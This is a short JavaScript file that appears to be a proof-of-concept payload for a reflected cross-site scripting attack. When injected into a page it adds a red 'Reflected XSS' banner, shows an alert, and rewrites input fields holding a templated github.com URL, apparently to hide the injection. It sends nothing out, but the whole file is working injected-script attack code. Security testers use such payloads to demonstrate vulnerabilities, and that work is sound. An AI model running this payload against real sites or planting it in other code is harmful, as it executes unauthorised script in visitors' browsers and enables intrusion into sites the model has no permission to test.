if (!window.xssIsExecuted) {
    window.xssIsExecuted = true;

    var xssText = '<div style="position:fixed;top:0px;left:0px;z-index:999;font-size:24px;background:red;color:white;">Reflected XSS</div>';
	document.body.insertAdjacentHTML('afterend', xssText);

    alert('hamburgerzzzz.');

    var inputs = document.getElementsByTagName('input');

    for (var x = 0; x < inputs.length; x ++) {
        if (/{{(.*)https:\/\/github.com\/(.*)}}/g.test(inputs[x].value)) {
            inputs[x].value = 'Test';
        }
    }
}
